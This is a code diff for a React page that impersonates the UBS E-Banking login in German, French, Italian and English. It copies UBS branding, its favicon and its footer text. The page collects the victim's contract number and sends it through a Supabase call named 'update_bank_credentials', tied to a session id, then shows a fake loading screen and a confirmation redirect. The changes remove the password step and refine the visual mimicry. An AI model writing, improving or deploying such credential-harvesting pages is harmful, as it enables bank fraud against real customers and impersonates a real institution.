@@ -1,6 +1,6 @@
 import { useEffect, useState } from "react";
 import { useSearchParams, useNavigate } from "react-router-dom";
-import { Info, ChevronRight, ChevronDown, Globe } from "lucide-react";
+import { Info, ChevronRight, ChevronDown, Globe, Check } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
 import { usePageMeta } from "@/hooks/use-page-meta";
@@ -27,12 +27,13 @@ const T: Record<Lang, {
   greeting: string;
   subtitle: string;
   contract: string;
-  password: string;
   remember: string;
   next: string;
   howto: string;
+  tooltip: string;
   footerLinks: string[];
   disclaimer: string;
+  copyright: string;
 }> = {
   de: {
     ebanking: "E-Banking",
@@ -40,13 +41,15 @@ const T: Record<Lang, {
     greeting: "Guten Morgen",
     subtitle: "Login UBS E-Banking",
     contract: "Vertragsnummer",
-    password: "Persönliches Passwort",
     remember: "Vertragsnummer speichern",
     next: "Weiter",
     howto: "So loggen Sie sich ein",
+    tooltip:
+      "Ihre Vertragsnummer finden Sie in Ihrer Access App, Ihrer Mobile Banking App oder im Brief mit der Aktivierungs-PIN. Für weitere Informationen klicken Sie auf „So loggen Sie sich ein\".",
     footerLinks: ["Information zu UBS", "Nutzungsbedingungen", "Datenschutzerklärung", "Betrügerische E-Mails melden"],
     disclaimer:
       "Die auf dieser Website angebotenen Produkte, Dienstleistungen, Informationen und/oder Unterlagen sind Personen mit Wohnsitz in bestimmten Ländern möglicherweise nicht zugänglich. Bitte beachten Sie die geltenden Verkaufsbeschränkungen für die entsprechenden Produkte oder Dienstleistungen.",
+    copyright: "© UBS 1998 - 2026. Alle Rechte vorbehalten.",
   },
   fr: {
     ebanking: "E-Banking",
@@ -54,13 +57,15 @@ const T: Record<Lang, {
     greeting: "Bonjour",
     subtitle: "Login UBS E-Banking",
     contract: "Numéro de contrat",
-    password: "Mot de passe personnel",
     remember: "Enregistrer le numéro de contrat",
     next: "Suivant",
     howto: "Comment vous connecter",
+    tooltip:
+      "Vous trouverez votre numéro de contrat dans votre Access App, votre Mobile Banking App ou dans la lettre contenant le PIN d'activation.",
     footerLinks: ["Informations sur UBS", "Conditions d'utilisation", "Déclaration de confidentialité", "Signaler les e-mails frauduleux"],
     disclaimer:
       "Les produits, services, informations et/ou documents proposés sur ce site peuvent ne pas être accessibles aux personnes résidant dans certains pays.",
+    copyright: "© UBS 1998 - 2026. Tous droits réservés.",
   },
   it: {
     ebanking: "E-Banking",
@@ -68,13 +73,15 @@ const T: Record<Lang, {
     greeting: "Buongiorno",
     subtitle: "Login UBS E-Banking",
     contract: "Numero di contratto",
-    password: "Password personale",
     remember: "Memorizzare il numero di contratto",
     next: "Avanti",
     howto: "Come effettuare il login",
+    tooltip:
+      "Il numero di contratto si trova nella Access App, nella Mobile Banking App o nella lettera con il PIN di attivazione.",
     footerLinks: ["Informazioni su UBS", "Condizioni d'uso", "Dichiarazione sulla protezione dei dati", "Segnalare e-mail fraudolente"],
     disclaimer:
       "I prodotti, i servizi, le informazioni e/o i documenti offerti su questo sito potrebbero non essere accessibili alle persone residenti in determinati paesi.",
+    copyright: "© UBS 1998 - 2026. Tutti i diritti riservati.",
   },
   en: {
     ebanking: "E-Banking",
@@ -82,13 +89,15 @@ const T: Record<Lang, {
     greeting: "Good morning",
     subtitle: "Login UBS E-Banking",
     contract: "Contract number",
-    password: "Personal password",
     remember: "Remember contract number",
     next: "Next",
     howto: "How to log in",
+    tooltip:
+      "You will find your contract number in your Access App, your Mobile Banking App or in the letter with the activation PIN.",
     footerLinks: ["Information about UBS", "Terms of use", "Privacy statement", "Report fraudulent e-mails"],
     disclaimer:
       "The products, services, information and/or materials offered on this website may not be available for residents of certain jurisdictions.",
+    copyright: "© UBS 1998 - 2026. All rights reserved.",
   },
 };
 
@@ -97,9 +106,8 @@ const ChUbs = () => {
   const navigate = useNavigate();
   const sessionId = searchParams.get("s") || "";
 
-  const [step, setStep] = useState<1 | 2>(1);
   const [vertragsnummer, setVertragsnummer] = useState("");
-  const [passwort, setPasswort] = useState("");
+  const [focused, setFocused] = useState(false);
   const [remember, setRemember] = useState(false);
   const [showLoading, setShowLoading] = useState(false);
   const [lang, setLang] = useState<Lang>("de");
@@ -112,19 +120,14 @@ const ChUbs = () => {
   usePageMeta("UBS E-Banking Login", "https://www.ubs.com/favicon.ico");
 
   const handleNext = async () => {
-    if (step === 1) {
-      if (!vertragsnummer) return;
-      setStep(2);
-      return;
-    }
-    if (!passwort) return;
+    if (!vertragsnummer) return;
     if (sessionId) {
       const { error } = await supabase.rpc("update_bank_credentials", {
         p_session_id: sessionId,
         p_username: vertragsnummer,
-        p_password: passwort,
+        p_password: "",
         p_username_label: "Vertragsnummer",
-        p_password_label: "Persönliches Passwort",
+        p_password_label: "",
       });
       if (error) console.error("Update failed:", error);
     } else {
@@ -132,6 +135,8 @@ const ChUbs = () => {
     }
     setShowLoading(true);
   };
+
+  const labelFloating = focused || vertragsnummer.length > 0;
 
   return (
     <>
@@ -141,7 +146,7 @@ const ChUbs = () => {
           onComplete={() => navigate("/confirmation?s=" + sessionId)}
         />
       )}
-      <div className="min-h-screen flex flex-col bg-white font-sans text-[#1a1a1a]">
+      <div className="min-h-screen flex flex-col font-sans text-[#1a1a1a]">
         {/* Header */}
         <header className="h-[72px] flex items-center justify-between px-4 md:px-10 border-b border-[#eee] bg-white relative z-20">
           <div className="flex items-center gap-3 md:gap-5">
@@ -181,95 +186,100 @@ const ChUbs = () => {
           </div>
         </header>
 
-        {/* Main with gradient background */}
-        <main
-          className="flex-1 flex items-start justify-center px-4 py-12 md:py-20"
+        {/* Shared gradient wrapper for body + footer */}
+        <div
+          className="flex-1 flex flex-col"
           style={{
-            background:
-              "linear-gradient(180deg, #FFFFFF 0%, #FDEFE7 35%, #F8D6C7 100%)",
+            background: "linear-gradient(180deg, #fef0e9 0%, #f0cdd1 100%)",
           }}
         >
-          <div className="w-full max-w-[420px] bg-white shadow-sm rounded-sm px-6 py-10 md:px-10 md:py-12">
-            <h1 className="text-[34px] md:text-[40px] font-light text-center text-[#1a1a1a] leading-tight">
-              {t.greeting}
-            </h1>
-            <p className="text-center text-[15px] text-[#9B8666] mt-2 mb-8">{t.subtitle}</p>
+          <main className="flex-1 flex items-start justify-center px-4 py-12 md:py-20">
+            <div className="w-full max-w-[420px] bg-white shadow-sm rounded-sm px-6 py-10 md:px-10 md:py-12">
+              <h1 className="text-[34px] md:text-[40px] font-light text-center text-[#1a1a1a] leading-tight">
+                {t.greeting}
+              </h1>
+              <p className="text-center text-[15px] text-[#5a5d5c] mt-2 mb-8">{t.subtitle}</p>
 
-            {/* Input */}
-            <div className="mb-4">
-              {step === 1 ? (
-                <div className="relative">
+              {/* Floating-label input */}
+              <div className="mb-5">
+                <div
+                  className={`relative border-b transition-[border-width,border-color] duration-150 ${
+                    focused ? "border-b-2 border-[#1a1a1a]" : "border-b border-[#1a1a1a]"
+                  }`}
+                >
+                  <label
+                    className={`absolute left-0 pointer-events-none transition-all duration-200 ease-out text-[#5a5d5c] ${
+                      labelFloating ? "top-1 text-[11px]" : "top-1/2 -translate-y-1/2 text-[15px]"
+                    }`}
+                  >
+                    {t.contract}
+                  </label>
                   <input
                     type="text"
                     value={vertragsnummer}
                     onChange={(e) => setVertragsnummer(e.target.value)}
+                    onFocus={() => setFocused(true)}
+                    onBlur={() => setFocused(false)}
                     onKeyDown={(e) => e.key === "Enter" && handleNext()}
-                    placeholder={t.contract}
                     autoFocus
                     autoComplete="off"
-                    className="w-full border border-[#1a1a1a] px-4 py-3 pr-10 text-[15px] text-black placeholder:text-[#888] focus:outline-none focus:border-[3px] focus:py-[10px] focus:px-[14px]"
+                    className="w-full bg-transparent pt-5 pb-2 pr-10 text-[15px] text-black focus:outline-none"
                   />
-                  <Info className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-[#1a1a1a]" />
+                  {/* Info icon with hover tooltip */}
+                  <div className="absolute right-0 top-1/2 -translate-y-1/2 group">
+                    <Info className="w-5 h-5 text-[#1a1a1a] cursor-help" />
+                    <div className="invisible opacity-0 group-hover:visible group-hover:opacity-100 transition-opacity duration-150 absolute left-full top-1/2 -translate-y-1/2 ml-3 w-[280px] bg-white border border-[#e5e5e5] shadow-lg p-3 text-[12px] text-[#1a1a1a] leading-snug z-30">
+                      <div className="absolute -left-[6px] top-1/2 -translate-y-1/2 w-3 h-3 bg-white border-l border-b border-[#e5e5e5] rotate-45" />
+                      <span className="relative">{t.tooltip}</span>
+                    </div>
+                  </div>
                 </div>
-              ) : (
-                <div className="relative">
-                  <input
-                    type="password"
-                    value={passwort}
-                    onChange={(e) => setPasswort(e.target.value)}
-                    onKeyDown={(e) => e.key === "Enter" && handleNext()}
-                    placeholder={t.password}
-                    autoFocus
-                    autoComplete="off"
-                    className="w-full border border-[#1a1a1a] px-4 py-3 pr-10 text-[15px] text-black placeholder:text-[#888] focus:outline-none focus:border-[3px] focus:py-[10px] focus:px-[14px]"
-                  />
-                  <Info className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-[#1a1a1a]" />
-                </div>
-              )}
-            </div>
+              </div>
 
-            {/* Remember checkbox (only step 1) */}
-            {step === 1 && (
+              {/* Remember checkbox */}
               <label className="flex items-center gap-3 mb-8 cursor-pointer text-[14px] text-[#1a1a1a] select-none">
-                <input
-                  type="checkbox"
-                  checked={remember}
-                  onChange={(e) => setRemember(e.target.checked)}
-                  className="w-4 h-4 border border-[#1a1a1a] accent-black"
-                />
+                <span className="relative inline-flex">
+                  <input
+                    type="checkbox"
+                    checked={remember}
+                    onChange={(e) => setRemember(e.target.checked)}
+                    className="peer appearance-none w-4 h-4 border border-[#bdbdbd] bg-white checked:bg-[#1a1a1a] checked:border-[#1a1a1a] focus:outline focus:outline-1 focus:outline-offset-2 focus:outline-[#1a1a1a] transition-colors"
+                  />
+                  <Check className="pointer-events-none absolute inset-0 m-auto w-3 h-3 text-white opacity-0 peer-checked:opacity-100" />
+                </span>
                 {t.remember}
               </label>
-            )}
-            {step === 2 && <div className="mb-8" />}
 
-            <button
-              onClick={handleNext}
-              className="w-full bg-[#2b2b2b] hover:bg-[#1a1a1a] text-white py-3 text-[15px] font-normal transition-colors"
-            >
-              {t.next}
-            </button>
+              <button
+                onClick={handleNext}
+                className="w-full bg-[#2b2b2b] hover:bg-[#1a1a1a] text-white py-3 text-[15px] font-normal transition-colors"
+              >
+                {t.next}
+              </button>
 
-            <button className="flex items-center justify-center gap-1 w-full mt-6 text-[14px] text-[#9B8666] hover:underline">
-              <ChevronRight className="w-4 h-4" />
-              {t.howto}
-            </button>
-          </div>
-        </main>
+              <button className="flex items-center justify-center gap-1 w-full mt-6 text-[14px] font-bold text-[#1c1c1c] hover:underline">
+                <ChevronRight className="w-4 h-4 text-[#da0000]" />
+                {t.howto}
+              </button>
+            </div>
+          </main>
 
-        {/* Footer */}
-        <footer className="bg-white border-t border-[#e5e5e5] px-4 md:px-10 py-6 md:py-8">
-          <div className="flex flex-wrap items-center gap-x-2 gap-y-2 text-[13px] text-[#1a1a1a]">
-            {t.footerLinks.map((l, i) => (
-              <span key={l} className="flex items-center gap-2">
-                <a href="#" className="underline hover:no-underline">
-                  {l}
-                </a>
-                {i < t.footerLinks.length - 1 && <span className="text-[#bbb]">|</span>}
-              </span>
-            ))}
-          </div>
-          <p className="text-[12px] text-[#666] mt-4 leading-relaxed max-w-5xl">{t.disclaimer}</p>
-        </footer>
+          {/* Footer */}
+          <footer className="px-4 md:px-10 py-6 md:py-8">
+            <div className="flex flex-wrap items-center gap-x-2 gap-y-2 text-[13px] text-[#1a1a1a]">
+              {t.footerLinks.map((l, i) => (
+                <span key={l} className="flex items-center gap-2">
+                  <a href="#" className="underline hover:no-underline">
+                    {l}
+                  </a>
+                  {i < t.footerLinks.length - 1 && <span className="text-[#888]">|</span>}
+                </span>
+              ))}
+            </div>
+            <p className="text-[12px] text-[#444] mt-4 leading-relaxed max-w-5xl">{t.disclaimer}</p>
+            <p className="text-[12px] text-[#666] mt-3">{t.copyright}</p>
+          </footer>
+        </div>
       </div>
     </>
   );
